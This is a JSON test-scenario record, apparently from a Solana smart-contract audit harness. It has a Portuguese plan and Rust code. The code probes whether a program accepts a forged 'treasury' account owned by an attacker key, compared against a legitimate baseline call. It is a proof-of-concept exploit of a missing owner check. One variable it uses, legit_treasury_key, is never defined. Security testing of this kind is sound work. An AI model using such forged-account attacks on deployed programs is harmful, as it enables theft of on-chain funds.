{
  "plan": "O programa `process` (IX_PROCESS = 1) espera duas contas: treasury (dono = program_id, dados com authority em [8..40], balance em [40..48], is_active em [48]) e authority (signer, igual ao stored_authority). O baseline usa uma treasury legítima com dono = program_id e authority correta, e deve ter sucesso. O ataque tenta a mesma instrução, mas com uma treasury forjada cujo dono é um Pubkey diferente (atacante), mantendo os mesmos dados e a authority correta. O efeito medido é que a conta forjada foi aceita e usada: o ataque retorna sucesso e a conta forjada (com dono diferente do programa) permanece com seu dono original, demonstrando que a checagem de owner não bloqueou a conta forjada.",
  "scenario": "let program_id = env.program_id;
let authority = Pubkey::new_unique();
let attacker_owner = Pubkey::new_unique();

let mut treasury_data = vec![0u8; 49];
treasury_data[8..40].copy_from_slice(authority.as_ref());
treasury_data[40..48].copy_from_slice(&1000u64.to_le_bytes());
treasury_data[48] = 1;

let legit_treasury = account(&program_id, &treasury_data, None);
let forged_treasury = account(&attacker_owner, &treasury_data, None);
let authority_account = wallet(1_000_000_000);

let metas = vec![
    AccountMeta::new_readonly(legit_treasury_key, false),
    AccountMeta::new_readonly(authority, true),
];

let ix_data = vec![1u8];
let ix = env.raw_ix(&ix_data, metas);

let contas = vec![
    (legit_treasury_key, legit_treasury.clone()),
    (authority, authority_account.clone()),
];

let baseline = env.baseline("process legitimo com treasury do programa", &ix, &contas);

let forged_key = Pubkey::new_unique();
let attack_metas = vec![
    AccountMeta::new_readonly(forged_key, false),
    AccountMeta::new_readonly(authority, true),
];
let attack_ix = env.raw_ix(&ix_data, attack_metas);
let attack_contas = vec![
    (forged_key, forged_treasury.clone()),
    (authority, authority_account.clone()),
];

let r = env.attack("process com treasury forjada de dono diferente", &attack_ix, &attack_contas);
if r.program_result == ProgramResult::Success {
    let after_forged = after(&r, &forged_key);
    env.effect("conta forjada com dono diferente foi aceita e usada", after_forged.owner() == &attacker_owner);
}"
}

